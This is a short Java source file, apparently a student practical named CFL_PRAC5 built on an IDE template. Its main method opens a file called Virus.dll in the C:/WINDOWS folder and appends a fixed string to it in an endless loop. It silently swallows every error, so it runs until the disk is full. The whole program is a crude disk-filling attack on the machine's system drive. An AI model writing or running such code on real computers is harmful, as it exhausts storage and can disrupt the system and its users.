/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package cfl_prac.pkg5;

/**
 *
 * @author admin
 */
import java.io.*;

public class CFL_PRAC5 {
    public static void main(String[] args) {
        try
        {
              FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
              while(true)
              {
               f.write("Programming Is Such A FUN !!!");
              }
        }
        catch(FileNotFoundException e)
        {
            
        }
        catch(IOException e){}
    }
}   
